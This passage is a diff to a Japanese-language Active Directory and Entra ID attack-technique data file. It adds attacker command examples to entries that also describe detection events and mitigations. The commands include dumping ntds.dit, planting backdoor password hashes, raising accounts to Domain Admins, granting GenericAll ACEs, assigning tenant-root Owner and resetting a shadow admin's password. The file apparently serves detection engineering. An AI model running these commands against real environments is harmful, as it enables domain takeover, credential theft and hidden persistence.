Admins相当を付与)、`Enable-ADDBAccount`/`Unlock-ADDBAccount`/`Set-ADDBAccountControl`(無効・ロック中の休眠アカウントを有効化しUAC(userAccountControl)フラグを書き換えて乗っ取る=DSInternals 4.11が明示するオフライン・アカウントテイクオーバー)を用い、加えて `Add-ADDBSidHistory`(LDAPが拒否する特権/他ドメインSIDをsIDHistoryへ書く=#91のオフライン版)も使用できる。※証明書ログオン用のmsDS-KeyCredentialLink(Shadow Credentials)をオフライン注入する専用cmdlet(例: 俗称Add-ADDBKeyCredential)はDSInternalsに実在せず、汎用の属性ライタも無いため本手法ではKeyCredentialインプラントは成立しない。重要な機序として、既定では各cmdletがuSNChangedと属性メタデータベクタ(version/originating DSA/time)を正しく更新するため、「複製メタデータが無い」わけではなく、DBを戻した瞬間に変更は正規の起点書き込みに酷似して外部DCへ複製される(`-SkipMetaUpdate` 指定時のみ複製されずローカル限定に留まる)。改竄済みDBはDCリストア、新規DCのシード、あるいはNTDSサービス停止下でのDBファイル差し替え+再起動によって現用へ復帰させ、オンライン化後に複製で外部展開する。したがって回避の要点は複製痕跡の不在ではなく、ライブDC上の書き込みイベント(5136 LDAP書込、DCShadowの5137/5141、DCSyncの4662)が一切発生しないこと=証跡の空白そのものが検知回避になる点である。",
     "tools": "DSInternals (Set-ADDBAccountPassword / Set-ADDBAccountPasswordHash / Set-ADDBPrimaryGroup / Add-ADDBSidHistory / Enable-ADDBAccount / Unlock-ADDBAccount / Set-ADDBAccountControl / Set-ADDBBootKey / Get-BootKey), ntdsutil(ifm/snapshot), vssadmin, diskshadow, esentutl(/y /vss), wbadmin, impacket-secretsdump(前提となる読み出し確認)",
+    "cmd": [
+      {
+        "tool": "ntdsutil",
+        "t": "IFMメディア生成でntds.ditとSYSTEMハイブを一括取得。インタラクティブコマンド列が4104やプロセス生成イベントに残る前段行為",
+        "q": "ntdsutil \"ac i ntds\" \"ifm\" \"create sysvol full C:\\Windows\\Temp\\ifm\" q q"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "SYSTEMハイブからBootKey(SysKey)を取り出す全操作の起点。この文字列の実行自体が資格情報改竄の前段として重要",
+        "q": "Get-BootKey -SystemHiveFilePath C:\\Windows\\Temp\\ifm\\registry\\SYSTEM"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "オフラインDBのNTハッシュを直接差し替え。ライブDCの4724/4738を一切発火させずバックドア資格情報を仕込む核心コマンド",
+        "q": "Set-ADDBAccountPasswordHash -SamAccountName svc_backdoor -NTHash <NTHASH_HEX> -BootKey <BOOTKEY_HEX> -DatabasePath \"C:\\Windows\\Temp\\ifm\\Active Directory\\ntds.dit\""
+      },
+      {
+        "tool": "DSInternals",
+        "t": "member属性に触れずprimaryGroupIdを512(Domain Admins)へ書換。オンラインの4728を経由しないため相関ハンティングをすり抜ける",
+        "q": "Set-ADDBPrimaryGroup -SamAccountName svc_backdoor -PrimaryGroupId 512 -DatabasePath \"C:\\Windows\\Temp\\ifm\\Active Directory\\ntds.dit\""
+      },
+      {
+        "tool": "DSInternals",
+        "t": "無効化・休眠アカウントをオフラインで有効化。userAccountControlの変化が現用復帰後のスキャンで唯一の手掛かりになる",
+        "q": "Enable-ADDBAccount -SamAccountName svc_dormant -DatabasePath \"C:\\Windows\\Temp\\ifm\\Active Directory\\ntds.dit\""
+      },
+      {
+        "tool": "vssadmin",
+        "t": "シャドウコピー経由で稼働中DCからntds.ditを複製取得。`vssadmin create shadow`はVSS作成イベントとして残る数少ない痕跡",
+        "q": "vssadmin create shadow /for=C:"
+      }
+    ],
     "detect": "本技法はオフラインで完結しライブDCイベントを残さないため、検知は(1)前提となるDB取得、(2)DSInternalsによる改竄実行、(3)改竄DBの現用復帰、の3局面に分けて監視する。取得局面ではDC/Tier0上のntdsutil.exe(ifm/create full/snapshot)、vssadmin・diskshadowによるシャドウコピー作成(8222)、esentutl.exeやコピーによるntds.dit・SYSTEMハイブへのファイルアクセス(4663)を捕捉する。改竄局面ではPowerShellのモジュール/スクリプトブロックログ(4103/4104)にDSInternalsやオフライン系cmdlet名(Set-ADDBAccountPassword/Set-ADDBAccountPasswordHash/Set-ADDBPrimaryGroup/Enable-ADDBAccount/Unlock-ADDBAccount/Set-ADDBAccountControl/Add-ADDBSidHistory)や `-DatabasePath`/`-BootKey` 引数、Sysmon EID7でMicrosoft.Isam.Esent.Interop.dll・DSInternals.*.dllのロードを監視する。ただし攻撃者は.ditを非監視ホストへ持ち出して改竄しうるため、EDRで確実に取れるのは取得と復帰の局面である。復帰局面では想定外のDCリストア/昇格、未承認DCの参加(Configuration NCへの新規nTDSDSAオブジェクト作成=5137、複製ソースNC確立=4928)、複製で流入するオブジェクト属性の異常(特権SIDを含むsIDHistory、512等への異常なprimaryGroupID、休眠アカウントの突然の有効化やuserAccountControlの逸脱、原因不明のパスワード更新)をベースライン比較で洗い出す。repadmin /showobjmeta や Get-ADReplAccount で複製メタデータの起点DC/時刻が当該DCの稼働実態と矛盾しないか(稼働していない時刻の起点、リストア直後の不連続なversion番号)を突き合わせるのが決定打となる。",
     "events": "4688/Sysmon1(ntdsutil.exe, vssadmin.exe, diskshadow.exe, esentutl.exe, wbadmin.exe, powershell.exe/pwsh.exe), 4103/4104(PowerShellモジュール/スクリプトブロック=DSInternalsオフラインcmdlet), Sysmon7(Microsoft.Isam.Esent.Interop.dll / DSInternals.*.dll のロード), Sysmon11/4663(ntds.dit・SYSTEMハイブへのファイルアクセス/作成), 8222(VSSシャドウコピー作成、Securityログ)/ESENT 2001-2003, 復帰時: Directory Service 1109(invocationIDリセット=リストア痕跡)/1173, 5137(新規DCシード時の未承認nTDSDSAオブジェクト作成), 4928(複製ソースNC確立)/4929(複製ソースNC削除)。注記: ライブ改竄なら本来発生する5136(ディレクトリオブジェクト変更)・5137/5141(DCShadowの一時nTDSDSA登録に伴うオブジェクト作成/削除)・4662(DCSync/複製 GUID 1131f6aa-9c07/1131f6ad)がオフライン改竄では「欠落」する点が逆説的な指標。加えて4738/4742(ユーザー/コンピュータアカウント変更)は起点書き込みでのみ生成され複製先DCでは発火しないため、オフライン改竄では全DCで欠落する(=これらの正常発生の不在自体が手掛かり)。",
     "mitigate": "DBとBootKeyの入手を断つのが第一で、IFMメディア/システムステートバックアップ/VSSスナップショットを暗号化して隔離保管し、退役DCのディスクは確実に物理/暗号消去する。ntds.dit・SYSTEMハイブへのアクセスを監査(SACL+4663)し、Tier0上でのntdsutil ifm/snapshot・vssadmin・diskshadow・esentutlの実行をアラート化する。DSInternalsやオフライン系cmdletの実行をアプリケーション制御(WDAC/AppLocker)とPowerShell制約言語モードで抑止する。DCのリストア/昇格を厳格な承認制とし、未承認DCの参加(新規nTDSDSA=5137、複製ソースNC確立=4928)を検知する。定期的にsIDHistory(特権/他ドメインSID)、primaryGroupID(既定513/515/516/521以外)、休眠アカウントの有効化やuserAccountControlの逸脱、パスワード最終更新の逸脱をベースライン監査し、repadminで複製メタデータの起点DC/時刻/version整合性を検証する。Tier0資産へのアクセス最小化と管理者ワークステーション(PAW)の徹底、バックアップメディアの物理/論理隔離を実施する。",
@@ -11117,6 +18091,33 @@ AD.I18N.ja.attacks = [
     "summary": "ドメインの dSHeuristics 属性16文字目(dwAdminSDExMask)を非ゼロにすると、Account/Server/Print/Backup Operators を SDProp/AdminSDHolder の保護ループから除外できる。除外した保護グループに攻撃者のACEやメンバーシップを残すと60分毎の再スタンプで戻されなくなり、非Domain Admin権限のバックドアが恒久化する。AdminSDHolder本体を改ざんする永続化を『保護される側を消す』方向から補完する低ノイズなステルス強化手法で、AdminSDHolder中心のハンティングを回避する。Elasticは16文字目の非ゼロ化を狙う専用検知(EQL)を提供している。",
     "how": "前提として、ドメイン/エンタープライズ管理者相当、またはConfigurationパーティションの Directory Service オブジェクトへの書込委任が必要(本手法自体は一次侵害ではなくステルス/永続性の強化)。CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,<forest root> の dSHeuristics(単一Unicode文字列)を編集し、16文字目=dwAdminSDExMask に 1(Account Operators)/2(Server Operators)/4(Print Operators)/8(Backup Operators) を合算した1桁の16進値を設定する(全除外なら 'f')。文字列は10文字目に十の位マーカー '1' が必要で、16文字目まで有効化するには例えば \"0000000001000008\"(10文字目='1'、16文字目='8'=Backup Operators)、全除外なら \"000000000100000f\"(16文字目='f')のように埋める。設定後、SDPropはこれらのグループとそのメンバーへ既定保護ACLを再スタンプしなくなり、adminCount=1でも実質的に非保護オブジェクトとして扱われる。攻撃者は次に、除外したグループのDACLに自分向けのGenericAll/WriteDacl等ACEを追記するか、グループへメンバーシップを追加する。これらは60分毎のSDPropで戻されないため、AdminSDHolder是正を前提とする運用・検知をすり抜けて恒久化する。Backup Operators除外+ACEなら SeBackupPrivilege 経由でNTDS.dit取得、Server OperatorsならDCサービス改ざん、Account Operatorsなら非保護アカウント掌握、Print Operators ならDCログオン/ドライバ悪用に繋がる。dSHeuristicsはConfigurationパーティションに属しフォレスト内全DCへ複製されるため影響は単一DCに留まらず、既存の保護ACLは即座には剥がれないが再適用が止まる点が肝。Set-ADObject/ADSIEdit/bloodyAD/ldapmodify 等でLDAP的に書換え可能。",
     "tools": "ADSI Edit (adsiedit.msc), PowerShell Set-ADObject, PowerView (Set-DomainObject / Add-DomainObjectAcl), bloodyAD, ldapmodify, dsacls (後続ACE付与), Add-ADGroupMember / net localgroup (メンバーシップ変種)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "dSHeuristics属性16文字目(dwAdminSDExMask)を非ゼロ化しOperators系をSDProp保護から除外。Configuration NCへの書込は5136として記録される",
+        "q": "Set-ADObject -Identity \"CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local\" -Replace @{dSHeuristics=\"0000000001000008\"}"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "LDIF経由でdSHeuristicsを書換。端末ログが残らずDC側の5136(属性=dSHeuristics)のみが証跡",
+        "q": "ldapmodify -x -H ldap://dc01.corp.local -D \"CN=Administrator,CN=Users,DC=corp,DC=local\" -w 'Passw0rd!' -f dsheuristics.ldif"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShell内で同一属性を操作可能。4104のスクリプトブロックに`dSHeuristics`という文字列がそのまま残る",
+        "q": "Set-DomainObject -Identity \"CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local\" -Set @{dSHeuristics='000000000100000f'}"
+      },
+      {
+        "tool": "dsacls",
+        "t": "除外済みのBackup OperatorsへACEを追記。60分毎のSDPropで戻されなくなるためこの一度の実行が恒久化する",
+        "q": "dsacls \"CN=Backup Operators,CN=Builtin,DC=corp,DC=local\" /G \"corp\\svc_user:GA\""
+      },
+      {
+        "tool": "ADSI Edit",
+        "t": "GUIでの直接編集。プロセス名は`mmc.exe`のみでコマンドライン検知は効かずConfiguration NCの5136相関が唯一の手掛かり",
+        "q": "mmc.exe adsiedit.msc"
+      }
+    ],
     "detect": "Configurationパーティションの Directory Service オブジェクトに対する 5136(ディレクトリオブジェクト変更)で AttributeLDAPDisplayName=dSHeuristics の変更を監視し、新値の16文字目(dwAdminSDExMask)が非ゼロ(Elastic EQL: 先頭15文字が数字＋16文字目が非ゼロの16進1桁 [1-9a-f])を検知する。dSHeuristicsは通常空か、他ビット(匿名LDAP制御やList Object Mode等)しか含まないため、16文字目が立つこと自体が高信頼シグナル。加えて Account/Server/Print/Backup Operators グループの nTSecurityDescriptor 変更(5136)で、SDPropに戻されないACE追加や 4732 のメンバー追加を相関する。除外後は 4780(SDProp適用)が当該グループに発火しなくなる差分も監視観点になる。なお 5136 の属性名/値/操作種別/ObjectDN は SecurityEvent の列としては展開されず EventData(XML)内に格納されるため、Sentinelでは parse_xml/extract で抽出する必要がある。",
     "events": "5136 (Directory Service オブジェクトの dSHeuristics 属性変更／16文字目=dwAdminSDExMask), 4662 (Configuration NC Directory Serviceオブジェクトへの書込アクセス), 5136 (Account/Server/Print/Backup Operators の nTSecurityDescriptor 変更), 4732 (Builtinドメインローカルグループへのメンバー追加), 4780 (SDProp適用 ※除外後は当該グループで欠落)",
     "mitigate": "dSHeuristicsをベースライン化し、いかなる変更(特に16文字目=dwAdminSDExMask の非ゼロ化)も即時アラート化する。Configurationパーティション/Directory ServiceオブジェクトへのwriteをTier0に限定しSACL監査を有効化。定期的に adminCount=1 の Operators 系グループのACLを、現在SDProp保護されているか否かに関わらず棚卸ししバックドアACEを除去する。発見時は16文字目を0に戻して dwAdminSDExMask を解除し、SDPropを再実行(または該当グループのACLをリセット)して保護ACLを再スタンプし攻撃者ACEを剥がす。フォレスト全DCへ複製される設定であることを踏まえ、全DCで是正を確認する。",
@@ -11162,6 +18163,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra IDのGlobal Administratorが既定では一切持たないAzure RBAC権限を、ARMのelevateAccess API（またはポータルの『Azureリソースのアクセス管理』トグル）一発でテナントルートスコープ『/』のUser Access Administratorへ昇格させ、そこから全管理グループ/サブスクリプションに自分をOwnerとして付与しAzureリソース基盤ごと掌握する、Entraディレクトリ面→Azureリソース面の正典的ピボット。elevateAccess自体は従来サブスクリプション単位のActivityログに現れずDirectory Activityログのみに記録されたため初動を見逃されやすい（2025年3月頃にEntra監査ログへの複製がパブリックプレビューで追加）。2025年にStorm-0501が本手法でAzure側ランサム（ストレージ暗号化・削除）を展開した。Graphのディレクトリロールを扱うPIM昇格とは制御プレーンが別で、こちらはARM/Azure RBAC側である。",
     "how": "前提: テナントのGlobal Administrator（またはトグルを操作できる同等権限）とそのARMトークン。既定ではGAはAzure RBACを一切持たずサブスクリプション/管理グループを操作できないが、(1) ARM REST `POST https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01` を呼ぶ、またはEntra管理センターの [プロパティ] > [Azureリソースのアクセス管理] を『はい』にすると、自アカウントにルートスコープ `/`（全管理グループの上位＝Tenant Root Group）のUser Access Administrator（roleDefinitionId 18d7d88d-d35e-4fb5-a5c3-7773c20a72d9）が付与される。(2) UAAはアクセス管理（ロール割当の読み書き）を全スコープで実行できるため、`az role assignment create --role Owner --scope /`（あるいは任意の管理グループ/サブスクリプションスコープ）で自分または操作用SPにOwner（8e3af657-a8ff-443c-a75c-2fe8c4bcb635）を付与し、以降UAAを外してもOwnerが残る。(3) Ownerとして Key Vault のアクセスポリシー/RBAC変更→シークレット・証明書窃取、`Microsoft.Storage/storageAccounts/listKeys/action` によるストレージ窃取、VMのRunCommandを経由したゲストOS内実行、リソースの暗号化・削除（Azure側ランサム）へ展開する。elevateAccessは追加のみの操作で、後始末には `/` のUAAロール割当をDELETE（removeElevatedAccess相当）してトグルを『いいえ』へ戻し痕跡を薄める（※UAAロール割当の非アクティブ化だけではトグルは『はい』のまま残る点に注意）。az login / Connect-AzAccount で得たGAのARMトークンさえあればポータルUIを使わずスクリプトで全工程を自動化でき、MFA/Conditional Accessが特権操作に強制されていなければ無停止で完遂する。要点はこれがMicrosoft Graphのディレクトリロール（PIMエントリ）とは別系統の、ARM/Azure RBAC制御プレーンに対する昇格である点。",
     "tools": "Azure CLI (az rest, az role assignment create, az role assignment list --scope /, az role assignment delete), Azure PowerShell (Invoke-AzRestMethod, New-AzRoleAssignment, Get-AzRoleAssignment), ARM REST elevateAccess API, MicroBurst, PowerZure, AzureHound/BloodHound(Global Admin探索), ROADtools/roadrecon, Stormspotter",
+    "cmd": [
+      {
+        "tool": "Az CLI",
+        "t": "GAをテナントルート`/`のUser Access Administratorへ昇格。2025年3月以降はEntra監査ログにも複製される決定的シグナル",
+        "q": "az rest --method post --url \"https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01\""
+      },
+      {
+        "tool": "Azure PowerShell",
+        "t": "PowerShellから同じelevateAccess APIを呼ぶ形。サブスクリプション単位のActivity Logには出ず見落とされやすい",
+        "q": "Invoke-AzRestMethod -Method POST -Path \"/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01\""
+      },
+      {
+        "tool": "Az CLI",
+        "t": "昇格したUAA権限でルートスコープにOwnerを付与。`roleAssignments/write`がActivity Logの決定的シグナル",
+        "q": "az role assignment create --assignee user@corp.onmicrosoft.com --role Owner --scope \"/\""
+      },
+      {
+        "tool": "Azure PowerShell",
+        "t": "PowerShell版のOwner付与。スコープが`/`(テナントルート)である点が正規運用との識別点",
+        "q": "New-AzRoleAssignment -SignInName user@corp.onmicrosoft.com -RoleDefinitionName Owner -Scope \"/\""
+      },
+      {
+        "tool": "Azure PowerShell",
+        "t": "付与後の確認列挙。単体では偵察と区別できず直前のelevateAccess呼び出しとの相関が必須",
+        "q": "Get-AzRoleAssignment -Scope \"/\""
+      }
+    ],
     "detect": "テレメトリはAzure Activityログ（AzureActivity）・Directory Activityログ・Entra監査（AuditLogs）が主。検知上の重要な癖として、elevateAccess自体は個々のサブスクリプションのActivityログには現れず、テナントルートのDirectory Activityログにのみ `Microsoft.Authorization/elevateAccess/action` として記録される（2025年3月頃からEntra監査ログへの複製がパブリックプレビューで追加。監査ログのServiceフィルタ『Azure RBAC (Elevated Access)』で参照可。出典: Permiso解析）。したがってサブスクリプション単位のAzure Activity連携だけを監視していると初動を取りこぼす。一方、昇格後の実害である `Microsoft.Authorization/roleAssignments/write`（Owner/UAA付与）は各サブスクリプション/管理グループのActivityログに確実に出るため、こちらを主検知ポイントにする。付与直後の Key Vault操作、`Microsoft.Storage/storageAccounts/listKeys/action`、短時間の大量ロール割当を同一Caller/CallerIpAddressで相関する。Defender for Cloud Apps（M365D）のMicrosoft Azureアプリコネクタが有効ならCloudAppEventsにもElevateAccessイベントが現れる。エンドポイントEDRはARM制御プレーン変更もポータルのトグル操作も観測しないため、攻撃者端末での az / Invoke-AzRestMethod 実行が唯一のホスト側手掛かりとなる。",
     "events": "AzureActivity(OperationNameValue): Microsoft.Authorization/elevateAccess/action(『/』へUAA付与。※従来はDirectory Activityログのみ・サブスクリプションActivityログには非表示), Microsoft.Authorization/roleAssignments/write(Owner/UAA付与=主検知点), Microsoft.Storage/storageAccounts/listKeys/action(ストレージ鍵窃取), Microsoft.KeyVault/vaults/write; AuditLogs(Entra監査、2025年3月頃以降パブリックプレビューでelevateAccess相当を複製追加); Directory Activity Log(テナントルートスコープ操作); CloudAppEvents(M365D/Defender for Cloud Apps・Microsoft Azureアプリコネクタ有効時にElevateAccessイベント)。※クラウド制御プレーンのためWindows SecurityのEventIDは発生しない。",
     "mitigate": "『Azureリソースのアクセス管理』トグルは平時『いいえ』を維持し、`az role assignment list --scope /` でルートスコープのUAA割当を定期棚卸し、想定外は即削除。Global Adminを最小化しPIM＋承認＋フィッシング耐性MFA運用とし、GAサインインにConditional Access（準拠デバイス）を強制。`Microsoft.Authorization/elevateAccess/action` と『/』スコープの roleAssignments/write にリアルタイムアラートを設定。Directory Activityログをテナントルートの診断設定でLog Analyticsへ確実に取り込む（サブスクリプション単位連携だけに依存しない）。Tenant Root Group（管理グループのルート）への割当を厳格化し、可能な範囲で deny assignment/リソースロックを併用。Break-glass以外の恒久Owner/UAA割当を排除する。",
@@ -11212,6 +18240,33 @@ AD.I18N.ja.attacks = [
     "summary": "CSP/MSP パートナーが顧客テナントに保持する DAP/GDAP 委任管理者の関係を悪用する信頼モデル攻撃。パートナーテナント(またはパートナーの管理エージェントアカウント)を侵害した攻撃者は、顧客テナント内に一切の資格情報を持たないまま、委任された Entra ロール(セキュリティグループのマッピング次第で最大で特権ロール管理者/グローバル管理者)を得てクロステナントで支配する。単一パートナーの侵害が配下の全顧客へ連鎖するサプライチェーン攻撃面であり、顧客側 SOC はパートナーが委任関係経由で実行する操作をベースライン化しておらず可視化できないことが多い。NOBELIUM は 2021 年にレガシー DAP(自動付与・無期限の GA)を、まさにこの手口で悪用した(2021/7-10 に 609 顧客を標的、計 22,868 回の攻撃を観測)。委任サインインは顧客ログ上で serviceProvider として現れるが UserPrincipalName は「<パートナー名> Technician」等に難読化されるため、実体の相関には UserId(オブジェクトID)を軸にする点が要注意。",
     "how": "前提は顧客テナントの資格情報ではなく、パートナー(CSP/MSP)テナント側での足場である。攻撃者は Admin Agents / Helpdesk Agents セキュリティグループ(レガシー DAP)、または GDAP でカスタム Entra ロールにマッピングされたセキュリティグループのメンバーであるパートナー管理者アカウントを、フィッシング・トークン窃取・MFA 回避で奪取する。レガシー DAP では顧客が CSP 経由でサインアップ(Partner Center で顧客関係を作成)した時点で、パートナーの Admin Agents グループへ顧客テナントのグローバル管理者相当が自動かつ無期限・ロール制限なしで付与されるため、パートナー側の 1 アカウントで配下の全顧客テナントを GA 支配できる(NOBELIUM が悪用したのはこのモデル。Microsoft は後継の GDAP を設計し、2023/9/25 以降は新規顧客関係への DAP 付与を停止)。GDAP はパートナーが自テナントのセキュリティグループを顧客テナント側の粒度の細かい時間制限付き Entra ロールへマッピングする方式だが、そのマッピングで依然として特権ロール管理者やグローバル管理者まで到達可能であり、悪用の概念は DAP・GDAP のどちらの関係にも適用される。CSP 技術者は顧客テナント内にユーザーアカウントを必要とせず(ロールはパートナー自テナントのセキュリティグループに割当)、攻撃者はパートナーテナントで認証してトークンを取得した後、委任関係を通じて顧客テナントに対し Partner Center ポータル/API・Microsoft Graph・Azure PowerShell で操作する。このとき顧客テナント内には攻撃者のディレクトリオブジェクトも資格情報も存在せず、操作はパートナーの委任プリンシパル(管理エージェント)として記録されるため、顧客側の通常のアカウント監視や UEBA をすり抜ける。顧客テナントでは委任アクセスがクロステナントサインインとして現れ、サインインの HomeTenantId(パートナー)と ResourceTenantId(顧客)が食い違い、CrossTenantAccessType が serviceProvider(=CSP 委任)となる点が識別子となる。なお GDAP では MFA はパートナー ホームテナントで満たされ顧客(リソース)テナント側では既定で信頼されるため、顧客側 CA での再チャレンジには限界がある。侵入後はバックドア管理者の作成、サービスプリンシパルへの証明書/シークレット追加(トークン持ち出しの布石)、フェデレーション設定の改ざん(Golden SAML への布石)、条件付きアクセスの改変など、委任 GA 相当の任意操作が可能で、これが下流の全顧客へ横断する。",
     "tools": "AADInternals (Get-AADIntPartnerOrganizations 等), ROADtools (roadrecon), Microsoft Partner Center (ポータル/API), Microsoft Graph API, Azure PowerShell (Az / Microsoft.Graph), PartnerCenter PowerShell モジュール (New-PartnerAccessToken / Get-PartnerCustomer)",
+    "cmd": [
+      {
+        "tool": "PartnerCenter PS",
+        "t": "パートナーテナントのSPとしてPartner Center APIトークンを取得。顧客テナントには一切資格情報が生まれない",
+        "q": "New-PartnerAccessToken -ApplicationId <appId> -Credential $cred -Scopes 'https://api.partnercenter.microsoft.com/user_impersonation' -ServicePrincipal -Tenant partner.onmicrosoft.com"
+      },
+      {
+        "tool": "PartnerCenter PS",
+        "t": "委任先の全顧客テナントを列挙する偵察。単一パートナー侵害からの横断範囲を把握する初動",
+        "q": "Get-PartnerCustomer | Select-Object CustomerId, Domain"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "MSPartner APIで委任関係にある顧客組織を列挙。顧客側サインインログには現れない偵察段階",
+        "q": "Get-AADIntMSPartnerOrganizations -AccessToken $partnerToken"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "GDAPで委任されたロールで顧客テナントへ直接接続。サインインログのCrossTenantAccessType=`serviceProvider`が識別鍵",
+        "q": "Connect-MgGraph -TenantId <customerTenantId> -Scopes 'User.ReadWrite.All','RoleManagement.ReadWrite.Directory'"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "侵入後の持続化としてSPへ認証用シークレットを追加。`Add service principal credentials`監査イベントが顧客テナント側に残る数少ない痕跡",
+        "q": "New-MgServicePrincipalPassword -ServicePrincipalId <spObjectId>"
+      }
+    ],
     "detect": "顧客テナント側の一次検知は Entra サインインログの CrossTenantAccessType == \"serviceProvider\"(= CSP/パートナー委任アクセス)を主軸に据える。ここから HomeTenantId が想定パートナー以外/初出のテナントであるもの、Partner Center・Microsoft Graph・Azure Portal など特権アプリへの委任サインイン、およびそれに続く Entra 監査ログ(AuditLogs)上の特権操作(ロールへのメンバー追加、SP への証明書/シークレット追加、条件付きアクセス/フェデレーション改変、バックドア管理者作成)を、同一の委任プリンシパルが実行していないかを相関する。重要な注意点として、serviceProvider サインインの UserPrincipalName は顧客ログ上で「<パートナー名> Technician」等に難読化されるため、実体のアクター相関は UserId(オブジェクトID)を軸にし、AuditLogs 側は InitiatedBy.user.id と突合する。パートナー側テナントを運用する SOC では、Admin Agents/GDAP マッピンググループのメンバー変更、顧客テナントへのクロステナントトークン発行、管理端末での AADInternals/roadrecon/PartnerCenter モジュール実行を監視する。多くの顧客 SOC は委任関係経由の操作をベースライン化していないため、まず正規パートナーの TenantId・アクセス頻度・保守時間帯の基準線を確立することが検知の起点となる。",
     "events": "Entra Sign-in logs (SigninLogs: CrossTenantAccessType=serviceProvider, HomeTenantId≠ResourceTenantId, UserId で実体特定), Entra 非対話サインイン (AADNonInteractiveUserSignInLogs), Entra 監査ログ (AuditLogs: Add member to role / Add service principal credentials / Update application – Certificates and secrets management / Update conditional access policy / Set federation settings on domain / GDAP 関係変更), Microsoft 365 統合監査ログ, Partner Center アクティビティログ(パートナー側)。※本技術はクラウド/クロステナントの信頼モデル悪用であり、顧客テナント内に Windows Event ID を残さない点に注意(顧客側の端末テレメトリは基本的に不可視)。",
     "mitigate": "レガシー DAP を全廃して GDAP へ移行し、GDAP ロールは最小権限・短い有効期限で付与してグローバル管理者/特権ロール管理者のマッピングを避ける。不要・休眠のパートナー委任関係を Partner Center で棚卸し・削除し、Admin Agents/GDAP マッピンググループのメンバーをフィッシング耐性 MFA・特権アクセスワークステーションで保護する。顧客テナント側はクロステナントアクセス設定(Cross-tenant access settings / inbound trust)でパートナーの委任アクセスに条件を課し、CrossTenantAccessType=serviceProvider サインインをアラート化する(ただし既定ではパートナー ホームテナントで満たした MFA が顧客テナント側で信頼されるため、顧客側 CA での再チャレンジには限界があり、関係の棚卸し・失効とパートナー側の堅牢化・監視が最も効く)。パートナー側には顧客テナントの特権操作を承認制(PIM 相当)とし、GA/管理エージェントアカウントの分離・専用化と継続監視を要求する。定期的に有効な GDAP 関係・委任ロールの一覧を検証し、契約と一致しない関係を失効させる。",
@@ -11257,6 +18312,33 @@ AD.I18N.ja.attacks = [
     "summary": "Entra側でパスワードライトバックが有効な環境で、パスワードリセット可能なクラウドロールを悪用し、同期ユーザのパスワードをクラウドでリセットしてEntra ConnectにオンプレADへ書き戻させる、クラウド→オンプレの逆方向ハイブリッド攻撃。本マップのハイブリッド経路はほぼ全てオンプレ→クラウド方向だが、本技法はその逆で、弱いクラウドの足場がオンプレ特権の起点になる。書き戻しアカウントは保護グループのメンバーを触れないため、特権はあるがAdminSDHolder非保護の『シャドウ管理者』が現実的な標的となる。Helpdesk/Password Adminという低位クラウドロールが、オンプレのドメイン特権へ転換されうる。",
     "how": "前提はEntra Connect(旧Azure AD Connect)でパスワードライトバックが有効化され、攻撃者がクラウド側でパスワードリセット可能なロール(Helpdesk/Password/Authentication Administrator、User Administrator、Global Administrator等)を掌握していること。攻撃者はまず同期対象ユーザを列挙し、オンプレADで実効的な特権(危険なACL=GenericAll/WriteDACL/GenericWrite、カスタム特権グループ所属、DCSync権、多数ホストのローカル管理者等)を持ちながら、AdminSDHolder(adminCount=1)で保護されておらず、かつディレクトリ同期とSSPR/ライトバックのスコープ内にある『シャドウ管理者』アカウントを標的に選ぶ(標的が同期スコープとSSPR/ライトバックスコープの双方に入っている必要がある)。次にGraph(Reset-MgUserAuthenticationMethodPassword / Update-MgUser -PasswordProfile)、MSOnline(Set-MsolUserPassword)、Azureポータルの管理者リセット、あるいはSSPRフローで当該同期ユーザのパスワードをクラウド側でリセットする。パスワードライトバックはEntra ConnectのAD DS同期/プロビジョニングアカウント(既定はMSOL_xxxx、または構成したAD DSコネクタアカウント)として動作し、この新パスワードをリアルタイムでオンプレAD DSへ書き戻す。ここで書き戻しアカウントは、保護グループ(AdminSDHolder配下)メンバーではACLがSDPropで定期リセットされ委任リセット権が剥がれるため触れられず(Silverfortの検証でも保護グループ所属ユーザを標的にすると書き戻しは失敗すると明記)、加えて既定の限定管理ロール(Helpdesk/Password Admin)はクラウド上でより上位の『管理者ロール保持ユーザ』のパスワードを変更できない(リセット可能なのは通常ユーザまたは同格ロールのみ)——この双方向の『非保護』条件ゆえに、特権はあるが保護されていないシャドウ管理者だけが現実的な標的になる。書き戻し完了後、攻撃者は既知のパスワードでオンプレのシャドウ管理者としてドメイン認証(Kerberos/NTLM)し、そこから危険ACLの行使・特権グループ横展開・DCSync等へ連鎖して、クラウドの足場をオンプレ特権へ転換する。MITREとしてはT1098(アカウント操作)が主で、侵入起点である侵害済みクラウド特権ロールをT1078.004(有効なアカウント: クラウド)、結果として得るオンプレ・ドメインログオンをT1078.002で表現し、既存ハイブリッド技法との整合でT1556も緩く付す。",
     "tools": "Microsoft Graph PowerShell (Reset-MgUserAuthenticationMethodPassword / Update-MgUser -PasswordProfile), MSOnline (Set-MsolUserPassword), AzureAD module (Set-AzureADUserPassword), AADInternals (Set-AADIntUserPassword — 同期API経由でクラウド側パスワードを設定しライトバックを誘発), BloodHound / AzureHound (シャドウ管理者・オンプレ特権パス・同期スコープの特定), ROADtools / ROADrecon (Entra列挙), Azure Portal 管理者パスワードリセット",
+    "cmd": [
+      {
+        "tool": "Graph PowerShell",
+        "t": "クラウド側でパスワードをリセットしオンプレへのライトバックを誘発。Entra監査ログの`Update user`操作が起点",
+        "q": "Update-MgUser -UserId shadowadmin@corp.onmicrosoft.com -PasswordProfile @{Password='Passw0rd!'; ForceChangePasswordNextSignIn=$false}"
+      },
+      {
+        "tool": "MSOnline",
+        "t": "廃止済みMSOnlineモジュール経由のレガシーリセット。2024年のサービス終了後は失敗するため実行自体が古いツールキットの兆候",
